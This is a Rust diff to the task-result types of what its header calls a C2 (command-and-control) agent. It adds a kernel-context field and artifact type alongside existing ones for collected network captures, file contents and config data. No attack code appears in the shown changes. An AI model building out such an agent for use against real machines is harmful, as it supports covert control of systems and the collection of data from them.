@@ -1,5 +1,6 @@
 //! Task definitions, scheduling, and result types for the C2 agent.
 
+use crate::kernel_context::KernelContext;
 use crate::{current_timestamp, generate_uuid};
 use serde::{Deserialize, Serialize};
 
@@ -88,6 +89,8 @@ pub struct TaskResult {
     pub execution_duration_ms: u64,
     pub exit_code: Option<i32>,
     pub artifacts: Vec<TaskArtifact>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub kernel_context: Option<KernelContext>,
 }
 
 /// A file or data blob collected during task execution.
@@ -111,6 +114,7 @@ pub enum ArtifactType {
     NetworkCapture,
     FileContent,
     ConfigData,
+    KernelContext,
     Custom(String),
 }
 
@@ -208,6 +212,7 @@ impl TaskResult {
             execution_duration_ms: ((end_time - start_time) * 1000),
             exit_code: Some(0),
             artifacts: Vec::new(),
+            kernel_context: None,
         }
     }
 
@@ -223,6 +228,7 @@ impl TaskResult {
             execution_duration_ms: ((end_time - start_time) * 1000),
             exit_code: Some(-1),
             artifacts: Vec::new(),
+            kernel_context: None,
         }
     }
 
@@ -238,7 +244,13 @@ impl TaskResult {
             execution_duration_ms: ((end_time - start_time) * 1000),
             exit_code: Some(-2),
             artifacts: Vec::new(),
+            kernel_context: None,
         }
+    }
+
+    pub fn with_kernel_context(mut self, ctx: KernelContext) -> Self {
+        self.kernel_context = Some(ctx);
+        self
     }
 
     pub fn with_artifact(mut self, artifact: TaskArtifact) -> Self {
